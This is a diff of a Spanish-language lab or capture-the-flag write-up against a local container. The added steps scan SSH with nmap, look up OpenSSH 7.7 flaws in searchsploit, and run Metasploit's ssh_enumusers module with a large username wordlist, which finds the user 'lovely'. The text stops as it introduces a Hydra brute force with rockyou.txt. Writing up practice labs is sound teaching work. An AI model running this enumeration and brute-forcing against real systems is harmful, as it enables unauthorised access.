@@ -51,16 +51,16 @@ Para simplificarnos el visionado de los puertos abiertos directamente abriremos 
 ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: allPorts
 ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ # Nmap 7.95 scan initiated Sun Sep  7 17:07:25 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
+   1   │ # Nmap 7.95 scan initiated Mon Sep  8 15:38:35 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
    2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
    3   │ Host: 172.17.0.2 () Status: Up
-   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
-   5   │ # Nmap done at Sun Sep  7 17:07:26 2025 -- 1 IP address (1 host up) scanned in 1.48 seconds
+   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///  Ignored State: closed (65534)
+   5   │ # Nmap done at Mon Sep  8 15:38:37 2025 -- 1 IP address (1 host up) scanned in 2.37 seconds
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
 ```bash
-❯ nmap -p22,80 -sCV 172.17.0.2 -oN targeted
+❯ nmap -p22 -sCV 172.17.0.2 -oN targeted
 ```
 
 * El parámetro -sCV es una conjunción de los parámetros:
@@ -74,26 +74,91 @@ Al igual que antes, para que la visualización de toda la información sea más 
 ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: targeted
 ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ # Nmap 7.95 scan initiated Sun Sep  7 17:14:20 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 172.17.0.2
+   1   │ # Nmap 7.95 scan initiated Mon Sep  8 15:39:37 2025 as: /usr/lib/nmap/nmap --privileged -p22 -sCV -oN targeted 172.17.0.2
    2   │ Nmap scan report for 172.17.0.2
    3   │ Host is up (0.00s latency).
    4   │ 
    5   │ PORT   STATE SERVICE VERSION
-   6   │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+   6   │ 22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
    7   │ | ssh-hostkey: 
-   8   │ |   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
-   9   │ |_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
-  10   │ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
-  11   │ | http-cookie-flags: 
-  12   │ |   /: 
-  13   │ |     PHPSESSID: 
-  14   │ |_      httponly flag not set
-  15   │ |_http-title: Iniciar Sesi\xC3\xB3n
-  16   │ |_http-server-header: Apache/2.4.52 (Ubuntu)
-  17   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
-  18   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-  19   │ 
-  20   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-  21   │ # Nmap done at Sun Sep  7 17:14:28 2025 -- 1 IP address (1 host up) scanned in 7.72 seconds
+   8   │ |   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
+   9   │ |   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
+  10   │ |_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
+  11   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
+  12   │ 
+  13   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  14   │ # Nmap done at Mon Sep  8 15:39:37 2025 -- 1 IP address (1 host up) scanned in 0.95 seconds
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
+Como la versión del servicio OpenSSH es menor o igual a la 7.7 sabemos que puede haber vulnerabilidades conocidas. Esto es algo que acabas aprendiendo de memoria pero, si queremos comprobarlo podemos hacer uso de la herramienta [searchsploit](https://github.com/topics/searchsploit) para ver si presenta o no alguna vulnerabilidad.
+```ruby
+❯ searchsploit OpenSSH 7.7
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                             |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                   | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                             | linux/remote/45210.py
+OpenSSH < 7.7 - User Enumeration (2)                                                                                                                       | linux/remote/45939.py
+----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+```
+Podemos observar que, efectivamente, hay un par de vulnerabilidades conocidas.  Aquí puedes tomar dos caminos.
+1. Utilizar alguna base de datos de CVEs para buscar algún script que poder ejecutar para explotarla.
+2. Utilizar metasploit.
+
+Yo decidí utilizar [metasploit](https://github.com/rapid7/metasploit-framework) en este caso añadiendo el parámetro -q para evitar el banner de inicio de la herramienta y así ganar más tiempo.
+```ruby
+❯ msfconsole -q
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+[*] Setting default action Malformed Packet - view all 2 actions with the show actions command
+msf auxiliary(scanner/ssh/ssh_enumusers) > show options 
+
+Module options (auxiliary/scanner/ssh/ssh_enumusers):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   CHECK_FALSE   true             no        Check for false positives (random username)
+   DB_ALL_USERS  false            no        Add all users in the current database to the list
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         22               yes       The target port
+   THREADS       1                yes       The number of concurrent threads (max one per host)
+   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
+   USERNAME                       no        Single username to test (username spray)
+   USER_FILE                      no        File containing usernames, one per line
+
+
+Auxiliary action:
+
+   Name              Description
+   ----              -----------
+   Malformed Packet  Use a malformed packet
+
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 172.17.0.2
+RHOST => 172.17.0.2
+msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+USER_FILE => /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
+[*] 172.17.0.2:22 - SSH - Using malformed packet technique
+[*] 172.17.0.2:22 - SSH - Checking for false positives
+[*] 172.17.0.2:22 - SSH - Starting scan
+[+] 172.17.0.2:22 - SSH - User 'mail' found
+[+] 172.17.0.2:22 - SSH - User 'root' found
+[+] 172.17.0.2:22 - SSH - User 'news' found
+[+] 172.17.0.2:22 - SSH - User 'man' found
+[+] 172.17.0.2:22 - SSH - User 'bin' found
+[+] 172.17.0.2:22 - SSH - User 'games' found
+[+] 172.17.0.2:22 - SSH - User 'nobody' found
+[+] 172.17.0.2:22 - SSH - User 'lovely' found
+[+] 172.17.0.2:22 - SSH - User 'backup' found
+[+] 172.17.0.2:22 - SSH - User 'daemon' found
+[+] 172.17.0.2:22 - SSH - User 'proxy' found
+[+] 172.17.0.2:22 - SSH - User 'list' found
+[+] 172.17.0.2:22 - SSH - User 'sys' found
+[+] Scanned 1 of 1 hosts (100% complete)
+[+] Auxiliary module execution completed
+```
+Una vez acabada la ejecución podemos observar el posible usuario de sistema, *lovely*.  Para comprobar si estamos en lo cierto, haremos uso de la herramienta de fuerza bruta [Hydra] utilizando *lovely* como nombre de usuario y el diccionario *rockyou.txt* para comprobar contraseñas
